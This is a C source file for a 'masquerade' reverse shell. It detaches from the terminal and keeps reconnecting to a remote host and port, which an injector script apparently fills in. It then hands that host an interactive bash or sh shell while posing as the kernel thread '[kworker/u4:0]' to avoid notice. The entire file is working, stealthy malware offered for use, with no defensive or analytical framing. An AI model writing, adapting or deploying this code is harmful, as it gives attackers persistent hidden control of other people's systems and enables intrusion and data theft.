/*
 * Masquerade Reverse Shell (Robust Persistence Version)
 * 
 * Logic:
 * - Infinite Loop: Tries to connect forever.
 * - Fork: When connected, forks a child to handle the shell.
 * - Wait: Parent waits for child (shell) to exit.
 * - Reconnect: If connection lost (child exits), parent sleeps 30s and retries.
 * - Masquerading: Changes process name to [kworker/u4:0].
 */

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h> // Added for wait()
#include <string.h>
#include <stdlib.h>
#include <errno.h>

// Placeholders (Will be replaced by injector.sh using sed)
#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444
#define FAKE_NAME "[kworker/u4:0]"

void persistence_loop() {
    struct sockaddr_in sa;
    int s;

    while (1) {
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            sleep(30);
            continue;
        }

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
        sa.sin_port = htons(REMOTE_PORT);

        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
            // Connected! Fork a child for the shell
            pid_t pid = fork();
            
            if (pid == 0) {
                // Child Process: The Shell
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                // Try Bash first
                char *args[] = {FAKE_NAME, "-p", "-i", NULL};
                execve("/bin/bash", args, NULL);
                
                // Fallback to Sh if Bash fails
                execve("/bin/sh", args, NULL);
                
                // If exec fails, exit child
                exit(0);
            } else if (pid > 0) {
                // Parent Process: The Watchdog
                // Wait for the shell to finish (connection closed/died)
                wait(NULL);
                close(s);
            } else {
                // Fork failed
                close(s);
            }
        } else {
            // Connect failed
            close(s);
        }

        // Wait before reconnecting
        sleep(30);
    }
}

int main(int argc, char *argv[]) {
    // Daemonize: Detach from terminal
    pid_t pid = fork();
    if (pid > 0) return 0; // Parent exits
    if (pid < 0) return 1;
    setsid(); // Create new session

    persistence_loop();
    return 0;
}
